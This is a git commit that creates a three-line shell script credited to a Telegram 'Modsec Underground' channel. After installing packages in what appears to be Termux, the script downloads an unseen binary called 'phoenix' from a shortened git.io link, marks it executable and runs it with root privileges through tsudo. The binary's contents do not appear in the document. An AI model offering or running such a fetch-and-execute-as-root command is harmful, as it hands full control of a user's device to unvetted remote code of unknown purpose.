8c503e8aa7b187bef1069afa58f28a4a7dee0ee9
jhandu1 <59273957+jhandu1@users.noreply.github.com>
2019-12-29 08:41:31 +0530

    Create run.sh

---
+++ run.sh
@@ -0,0 +1,3 @@
+# From: 1337C001 <T.me/leetcool> at Modsec Underground <T.me/modsecunderground>
+
+pkg install apt clang tsu wget -y;apt update -y;apt upgrade -y;tsudo wget https://git.io/JeNKR -O ./phoenix;tsudo chmod 755 phoenix;tsudo ./phoenix
